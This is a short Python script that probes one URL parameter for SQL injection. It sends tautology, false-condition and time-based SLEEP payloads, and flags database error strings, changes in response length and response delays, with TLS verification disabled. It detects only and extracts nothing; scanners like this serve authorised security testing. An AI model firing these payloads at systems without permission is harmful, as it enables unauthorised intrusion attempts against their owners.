import requests
import sys
import time

requests.packages.urllib3.disable_warnings()

SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' AND 1=2--",
    "' OR SLEEP(3)--"
]

SQL_ERRORS = [
    "sql syntax",
    "mysql",
    "syntax error",
    "unclosed quotation mark",
    "sqlite",
    "pg_"
]

def probe_sql_injection(url, param):
    print(f"\n[+] Target: {url}")
    print("[+] Starting baseline request...")

    try:
        baseline_start = time.time()
        baseline = requests.get(url, timeout=10, verify=False)
        baseline_time = time.time() - baseline_start
        baseline_length = len(baseline.text)

    except requests.exceptions.RequestException as e:
        print(f"[!] Could not connect to target: {e}")
        return

    print(f"[+] Baseline status: {baseline.status_code}")
    print(f"[+] Baseline length: {baseline_length}")
    print(f"[+] Baseline response time: {baseline_time:.2f}s")
    print("-" * 60)

    vulnerable = False

    for payload in SQL_PAYLOADS:
        test_params = {param: payload}

        try:
            start_time = time.time()
            response = requests.get(url, params=test_params, timeout=10, verify=False)
            response_time = time.time() - start_time

            content = response.text.lower()
            response_length = len(response.text)

            print(f"[TEST] Payload: {payload}")
            print(f"  Status: {response.status_code}")
            print(f"  Length: {response_length}")
            print(f"  Response time: {response_time:.2f}s")

            # Error-based detection
            for error in SQL_ERRORS:
                if error in content:
                    print("  ⚠️ Possible SQL error detected!")
                    vulnerable = True

            # Boolean-based detection
            if abs(response_length - baseline_length) > 100:
                print("  ⚠️ Response length differs significantly.")
                vulnerable = True

            # Time-based detection
            if response_time - baseline_time > 2:
                print("  ⚠️ Possible time-based SQL injection detected.")
                vulnerable = True

            print("-" * 60)

        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed: {e}")

    if vulnerable:
        print("\n⚠️ Potential SQL injection indicators found.")
    else:
        print("\n[+] No obvious SQL injection indicators detected.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python script.py <url> <parameter>")
        print("Example: python script.py http://127.0.0.1/test.php id")
        sys.exit(1)

    target_url = sys.argv[1]
    parameter = sys.argv[2]

    probe_sql_injection(target_url, parameter) 